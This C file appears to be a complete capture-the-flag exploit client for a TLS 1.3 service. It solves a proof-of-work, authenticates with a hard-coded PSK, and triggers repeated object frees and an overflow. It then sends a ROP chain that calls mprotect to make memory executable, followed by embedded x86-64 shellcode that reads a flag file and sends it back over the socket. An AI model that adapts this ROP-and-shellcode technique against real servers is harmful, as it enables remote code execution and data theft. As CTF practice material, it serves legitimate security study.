#define _GNU_SOURCE


#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sys/mman.h>
#include <signal.h>
#include <string.h>

#include "openssl/crypto.h"
#include "openssl/ssl.h"
#include "openssl/err.h"
#include "assert.h"

#include "ssl_helper.h"
#include "challenge_consts.h"

int socketFd = -1;
uint64_t ans = 0;

#define PSK_ID "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCC"


void doLockThread(SSL * ssl, uint32_t whichThread, uint32_t target);
void doUnlockThread(SSL * ssl, uint32_t whichThread, uint32_t target);

#define CONNECTION_PORT 31337

int do_data_transfer(SSL *ssl);
struct brutey {
    uint8_t chal[POW_CHAL_SIZE];
    uint64_t ctr;
    pthread_t thread_id;
};


SSL_CTX *create_context()
{
    SSL_CTX *ctx;

    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        PRINT("SSL ctx new failed\n");
        return NULL;
    }
    SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
    
    PRINT("SSL context created\n");

    return ctx;
}


unsigned int tls13_psk_out_of_bound_cb(SSL *ssl, const char *hint,
                                       char *identity,
                                       unsigned int max_identity_len,
                                       unsigned char *psk,
                                       unsigned int max_psk_len)
{
    unsigned int result_len;
    unsigned char result[EVP_MAX_MD_SIZE];

    strcpy(identity, PSK_ID);

    HMAC(EVP_sha256(),
         HMAC_KEY, sizeof(HMAC_KEY),
         (uint8_t*) identity, strlen(identity),
         result, &result_len);
    
    if(result_len > max_psk_len)
    {
        result_len = max_psk_len - 1;
    }

    memcpy(psk, result, result_len);
    dumpBuf("CPSK", psk, result_len);
    return result_len;
}


void cBrute(struct brutey * state)
{
    uint8_t resp[POW_CHAL_RESP_SIZE] = { 0 }; 
    unsigned char digest[SHA512_DIGEST_LENGTH];
    SHA512_CTX ctx;
    uint64_t ctr = state->ctr;
    memcpy(resp,state->chal,POW_CHAL_SIZE);


    while(ans == 0)
    {
        int found;
        *(uint64_t*)&resp[POW_CHAL_SIZE+8] = ctr++;
        SHA384_Init(&ctx);
        SHA384_Update(&ctx, resp, POW_CHAL_RESP_SIZE);
        SHA384_Final(digest, &ctx);
        found = digest[0] | (digest[1]<<8) | (digest[2] << 16) | (digest[3] << 24);
        if((found & POW_MASK) == 0)
        {
            found = found & POW_MASK;
            PRINT("Found 24 bit hit at %llx %02x %d\n", ctr, found,  __builtin_popcount(found));
            if(found == 0){
                PRINT("Finished %lx\n", ctr-1);
                atomic_store(&ans, ctr-1);
                break;
            }
        }
    }
    PRINT("Hashed %lx\n", ctr- state->ctr);
}


int doPOWChalClient(int fd){
    uint8_t challenge[POW_CHAL_SIZE] = { 0 }; 
    uint8_t resp[POW_CHAL_RESP_SIZE] = { 0 }; 
    int bytesRead ;
    pthread_attr_t attr;
    int threadRet;
    struct brutey brutes[NUM_THREADS];


    bytesRead = read(fd,challenge,POW_CHAL_SIZE);
    assert(bytesRead== POW_CHAL_SIZE);
    
    threadRet = pthread_attr_init(&attr);
    assert(threadRet == 0);
    threadRet = pthread_attr_setstacksize(&attr, THREAD_STACK_SIZE);
    assert(threadRet == 0);

    dumpBuf("CHAL", challenge, POW_CHAL_SIZE);

    PRINT("Starting POW Challenge\n");

    for (int tnum = 0; tnum < NUM_THREADS; tnum++) {
        PRINT("Starting thread %d\n", tnum);
        brutes[tnum].ctr = 0x10000000000*tnum;
        memcpy(brutes[tnum].chal, challenge, POW_CHAL_SIZE);
        threadRet = pthread_create(&brutes[tnum].thread_id, &attr,
                         (void*)  &cBrute, &brutes[tnum]);
        assert(threadRet == 0);
    }

    pthread_attr_destroy(&attr);

    while(ans == 0){
        sleep(1);
    }

    memcpy(resp,challenge,POW_CHAL_SIZE);
    dumpBuf("RES1", resp, POW_CHAL_SIZE);

    *(uint64_t*)&resp[POW_CHAL_SIZE+8] = ans;
    dumpBuf("RES2", resp, POW_CHAL_SIZE);

    write(fd, resp, POW_CHAL_RESP_SIZE);
    sleep(1);
    PRINT("Completed POW Challenge\n");
    return 1;
}

SSL *create_ssl_object(SSL_CTX *ctx, char * target)
{
    SSL *ssl;
    int fd;

    fd = do_tcp_connection(target, SERVER_PORT);
    if (fd < 0) {
        PRINT("TCP connection establishment failed\n");
        return NULL;
    }
    socketFd = fd ;
    doPOWChalClient(fd);

    ssl = SSL_new(ctx);
    if (!ssl) {
        PRINT("SSL object creation failed\n");
        return NULL; 
    }

    SSL_set_fd(ssl, fd);

    SSL_set_psk_client_callback(ssl, tls13_psk_out_of_bound_cb);

    PRINT("SSL object creation finished\n");

    return ssl;
}

int writeClientInt(SSL * ssl, unsigned int val)
{
    int toWrite = htonl(val);
    int ret = SSL_write(ssl, &toWrite, READ_INT_LEN);
    assert(ret==4);
    return READ_INT_LEN;
}

#define RANDOM_TRAILER (16)

void doGetEnv(SSL * ssl, char * name)
{
    int ret;
    int nameLen = strlen(name);
    int cmd = htonl(GETENV_CMD);
    int threadNum = htonl(4);
    int envLen;
    char buf[4096];
    uint8_t envVal[8192];
    
    memset(buf,0,sizeof(buf));

    memcpy(buf,&cmd,READ_INT_LEN);
    memcpy(&buf[READ_INT_LEN],&threadNum,READ_INT_LEN);
    memcpy(&buf[READ_INT_LEN*2], name, nameLen);

    ret = SSL_write(ssl,buf,nameLen+READ_INT_LEN*2);
    assert(ret==nameLen+READ_INT_LEN+READ_INT_LEN);

    ret = SSL_read(ssl, envVal, sizeof(envVal));
    PRINT("RET = %d\n",ret);

    assert(ret > 0);
    read(socketFd, buf, RANDOM_TRAILER);
    envVal[ret] = 0;
    envLen = strlen((const char*)envVal);
    if(envLen > 512){
        for(int i = 0; i < 12; i++)
        {
            PRINT("%02X", envVal[ret-12+i]);
        }
        PRINT("\n");
    }
    else {
        PRINT("Env %s=%s\n",name,envVal);
    }
}
void doSetEnv(SSL * ssl, const char * name, const char * value)
{
    char buf[4096];
    int cmd = htonl(SETENV_CMD);
    int threadNum = htonl(2);
    int nameLen = strlen(name);
    int valueLen = strlen(value);
    int totLen = nameLen+valueLen+READ_INT_LEN*2+2;
    int ret;

    memset(buf,0,sizeof(buf));

    memcpy(buf,&cmd,READ_INT_LEN);
    memcpy(&buf[READ_INT_LEN],&threadNum,READ_INT_LEN);

    strcpy(&buf[READ_INT_LEN*2],name);
    strcpy(&buf[READ_INT_LEN*2+nameLen+1],value);

    ret = SSL_write(ssl,buf,totLen);
    assert(ret==totLen);
    ret = SSL_read(ssl, buf, 4096);
    read(socketFd, buf, RANDOM_TRAILER);

}

void dofreeObj(SSL * ssl, int objNum)
{
    char buf[4096];
    int cmd = htonl(FREE_OBJECT_CMD);
    int totLen = READ_INT_LEN*2+2;
    int ret;
    objNum = htonl(objNum);
    
    memset(buf,0,sizeof(buf));

    memcpy(buf,&cmd,READ_INT_LEN);
    memcpy(&buf[READ_INT_LEN],&objNum,READ_INT_LEN);

    ret = SSL_write(ssl,buf,totLen);
    assert(ret==totLen);
    ret = SSL_read(ssl, buf, 4096);
    read(socketFd, buf, RANDOM_TRAILER);
}


void doReturn(SSL * ssl)
{
    char buf[4096];
    int cmd = htonl(RETURN_CMD);
    int totLen = READ_INT_LEN*2;
    int ret;

    memset(buf,0,sizeof(buf));
    memcpy(buf,&cmd,READ_INT_LEN);

    ret = SSL_write(ssl,buf,totLen);
    assert(ret==totLen);
    ret = SSL_read(ssl, buf, 4096);
    read(socketFd, buf, RANDOM_TRAILER);

}


void doLeak(SSL * ssl, const char * name)
{
    PRINT("Leak staged for %s\n", name);
    char buf[WORKING_BUF_LEN];
    int cmd = htonl(SETENV_CMD);
    int ret;

    memset(buf, 0x41, WORKING_BUF_LEN);
    memcpy(buf, &cmd, READ_INT_LEN);

    strcpy(&buf[READ_INT_LEN],name);

    ret = SSL_write(ssl,buf,WORKING_BUF_LEN);
    assert(ret==WORKING_BUF_LEN);
    
    ret = SSL_read(ssl, buf, 4096);
    read(socketFd, buf, RANDOM_TRAILER);


}


void do_cleanup(SSL_CTX *ctx, SSL *ssl)
{
    int fd;
    if (ssl) {
        fd = SSL_get_fd(ssl);
        SSL_free(ssl);
        close(fd);
    }
    if (ctx) {
        SSL_CTX_free(ctx);
    }
}

void get_error()
{
    unsigned long error;
    const char *file = NULL;
    int line= 0;
    error = ERR_get_error_line(&file, &line);
    PRINT("Error reason=%d on [%s:%d]\n", ERR_GET_REASON(error), file, line);
}

int tls13_client(char * target)
{
    SSL_CTX *ctx;
    SSL *ssl = NULL;
    int ret_val = -1;
    int ret;

    ctx = create_context();
    if (!ctx) {
        return -1;
    }

    ssl = create_ssl_object(ctx, target);
    if (!ssl) {
        goto err_handler;
    }

    ret = SSL_connect(ssl); 
    if (ret != 1) {
        PRINT("SSL connect failed%d\n", ret);
        if (SSL_get_error(ssl, ret) == SSL_ERROR_SSL) {
            get_error();
        }
        goto err_handler;
    }
    PRINT("SSL connect succeeded\n");

    PRINT("Negotiated Cipher suite:%s\n", SSL_CIPHER_get_name(SSL_get_current_cipher(ssl)));
    if (do_data_transfer(ssl)) {
        PRINT("Data transfer over TLS failed\n");
        goto err_handler;
    }
    PRINT("Data transfer over TLS succeeded\n");
    SSL_shutdown(ssl);
    ret_val = 0;
err_handler:
    do_cleanup(ctx, ssl);
    return ret_val;
}

int main(int argc, char *argv[])
{
    PRINT("OpenSSL version: %s, %s\n", OpenSSL_version(OPENSSL_VERSION), OpenSSL_version(OPENSSL_BUILT_ON));
    if(argc < 2)
    {
        printf("Please Supply a target IP \n");
        exit(1);
    }
    char * target = argv[1];


    if (tls13_client(target)) {
        PRINT("TLS12 client connection failed\n");
        fflush(stdout);
        return -1;
    }
    return 0;
}


void doLockThread(SSL * ssl, uint32_t whichThread, uint32_t target)
{
    uint32_t buf[32];
    int ret;
    int totLen = READ_INT_LEN * 3;
    buf[0] = htonl(LOCK_OBJ_CMD);
    buf[1] = htonl(whichThread);
    buf[2] = htonl(target);

    ret = SSL_write(ssl,buf, totLen);
    assert(ret==totLen);
    ret = SSL_read(ssl, buf, 4096);
    read(socketFd, buf, RANDOM_TRAILER);

}

void doUnlockThread(SSL * ssl, uint32_t whichThread, uint32_t target)
{
    uint32_t buf[32];
    int ret;
    int totLen = READ_INT_LEN * 3;
    buf[0] = htonl(UNLOCK_OBJ_CMD);
    buf[1] = htonl(whichThread);
    buf[2] = htonl(target);

    ret = SSL_write(ssl,buf, totLen);
    assert(ret==totLen);
    ret = SSL_read(ssl, buf, 32);
    read(socketFd, buf, RANDOM_TRAILER);

}

struct __attribute__((scalar_storage_order("big-endian"))) sto {
    uint32_t cmd;
    uint32_t whichObj;
    uint64_t objLen;
    uint8_t buf[0];
} __attribute__((__packed__));

void doStoreObj(SSL * ssl, uint8_t * src, uint64_t length, uint32_t objNum, uint32_t realLen)
{
    struct sto * store = malloc(32000);
    int totLen = sizeof(struct sto) + length;
    int polyIter = 0;
    int ret;
    uint8_t * shellCode;
    uint64_t * ropChain;
    uint8_t sc[] = { 0x48, 0xB8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x50, 0x48, 0xB8, 0x2F, 0x2E, 0x67, 0x6D, 0x60, 0x66, 0x01, 0x01, 0x48, 0x31, 0x04, 0x24, 0x6A, 0x02, 0x58, 0x48, 0x89, 0xE7, 0x31, 0xF6, 0x0F, 0x05, 0x41, 0xBA, 0xFF, 0xFF, 0xFF, 0x7F, 0x48, 0x89, 0xC6, 0x6A, 0x28, 0x58, 0x6A, 0x04, 0x5F, 0x99, 0x0F, 0x05 };

    memset(store, 0, 32000);
    store->objLen = length;
    store->cmd = STORE_OBJ_CMD;
    store->whichObj = objNum << OBJ_OFFSET;
    if(totLen > 16000)
    {
        totLen = 16000;
    }
    PRINT("Writing %d bytes into buffer\n",totLen);

    for(int iter1 = 0; iter1 < 52; iter1++)
    {
        for(int iter2 = 0; iter2 < 52; iter2++)
        {
            for(int decVal =0; decVal < 100; decVal++)
            {
                char toWrite[4];
                char c1,c2,c3,c4;
                if(iter1 < 26)
                {
                    c1 = iter1+0x41; 
                }
                else
                {
                    c1 = (iter1%26)+0x61;
                }
                if(iter2 < 26)
                {
                    c2 = iter2+0x41; 
                }
                else
                {
                    c2 = (iter2%26)+0x61;
                }
                c3 = ((decVal/10) % 10) + 0x30;
                c4 = (decVal % 10) + 0x30;
                toWrite[0] = c1;
                toWrite[1] = c2;
                toWrite[2] = c3;
                toWrite[3] = c4;
                memcpy(store->buf + polyIter, toWrite, 4);
                polyIter += 4;
                if(polyIter >= totLen)
                {
                    break;
                }
            }
            if(polyIter >= totLen)
            {
                break;
            }
        }
        if(polyIter >= totLen)
        {
            break;
        }
    }
//    printf("\n%s\n",store->buf);

    memcpy(store->buf, src, realLen);

    //pc find
    memset(store->buf+672,'A',8);
    //This is top of stack
    ropChain = (void*)(store->buf+680);

    ropChain[0] = 0x00000000004ed4ff;
    ropChain[1] = 0x0000000000404acf;
    ropChain[2] = 0x0000000000404605;
    ropChain[3] = PROT_WRITE | PROT_READ | PROT_EXEC;
    ropChain[4] = 0x0574608; // Mprotect
    ropChain[5] = 0x0000000000400126;
    ropChain[6] = 0x000000000052003f ; //rax
    ropChain[7] = 0x0000000000464652; 
    ropChain[37] = 0x9090909090909090;
    shellCode = (uint8_t*) &ropChain[38];
    memcpy(shellCode, sc, sizeof(sc));


    ret = SSL_write(ssl, store, totLen);
    assert(ret==totLen);
    ret = SSL_read(ssl, store, 4096);
    read(socketFd, store, RANDOM_TRAILER);
    PRINT("RET=%d\n",ret);
    free(store);

}
struct __attribute__((scalar_storage_order("big-endian"))) enco {
    uint32_t cmd;
    uint32_t whichObj;
    uint32_t targetObj;
    uint32_t objLen;
} __attribute__((__packed__));



void doEncodeObject(SSL * ssl, uint32_t which, uint32_t target, uint32_t outputLength)
{
    struct enco * store = malloc(sizeof(struct enco));
    char * outputHex = malloc(outputLength);
    char randomTrailer[RANDOM_TRAILER];
    int totLen = sizeof(struct sto);
    int ret;

    store->objLen = outputLength;
    store->cmd    = HEX_ENCODE_CMD;
    store->whichObj  = which;
    store->targetObj = target;

    ret = SSL_write(ssl, store, sizeof(struct enco));
    assert(ret==totLen);
    SSL_read(ssl, outputHex, outputLength);
    read(socketFd, randomTrailer, RANDOM_TRAILER);

}


int do_data_transfer(SSL *ssl)
{
    PRINT("Size_t=%d\n", sizeof(size_t));
    signal(SIGPIPE, SIG_IGN);
    doSetEnv(ssl, "BLAH", "BLAG");
    doGetEnv(ssl, "BLAH");
    doSetEnv(ssl, "BLAHD", "BLAGasdfnuafnuiawfeniauwfe");
    doGetEnv(ssl, "BLAHD");
    doSetEnv(ssl, "BLAHY", "BLAGiuawfiubawiubfioawbefiuawfiouabwefioabwiufwafieob");

    dofreeObj(ssl,2);
    dofreeObj(ssl,7);
    dofreeObj(ssl,7);
    dofreeObj(ssl,7);
    dofreeObj(ssl,7);
    dofreeObj(ssl,7);
    dofreeObj(ssl,7);
    dofreeObj(ssl,7);

    doSetEnv(ssl, "BLAD", "BLAGasdfnuafnuiawfeniauwfe");
    doGetEnv(ssl, "nafiuuaw");
    doSetEnv(ssl, "ENVBASE", "ENVKEY");
    doGetEnv(ssl, "ENVBASE");

    doStoreObj(ssl, (uint8_t*)"DEFG\x00", 6, 12,5);
    doStoreObj(ssl, (uint8_t*)"DEFG\x00", 6, 12,5);
//    #si_addr=0x7f097cabafd0
//    #si_addr=0x7f097cafa350
    sleep(5);
    doStoreObj(ssl, (uint8_t*)"DEFG\x00", THREAD_STACK_SIZE*2-0x5000+0x200+0x100, 11, 5);
    doLockThread(ssl, 4, 1);
    doLockThread(ssl, 4, 2);
    doLockThread(ssl, 4, 8);
    doLockThread(ssl, 4, 16);

    doStoreObj(ssl, (uint8_t*)"DEFG\x00", 6, 98, 5);
    doStoreObj(ssl, (uint8_t*)"DEFG\x00", 6, 123, 5);

    PRINT("SHOULD CRASH\n");
    doEncodeObject(ssl, 4, 704, 2000);

    sleep(1);

    //doUnlockThread(ssl, 4, 1);
    //doUnlockThread(ssl, 4, 2);
    doUnlockThread(ssl, 4, 8);
    doUnlockThread(ssl, 4, 16);
    uint8_t buf[512];
    sleep(1);

    memset(buf, 0, sizeof(buf));
    int bytesRead = read(socketFd, buf, 512);

    char * flag = memmem(buf, bytesRead, "flag{", 5);
    if(flag != 0)
    {
        printf("%s", flag);
        exit(0);
    }
    else
    {
        exit(10);
    }
    sleep(30);
    doReturn(ssl);


    return 0;
}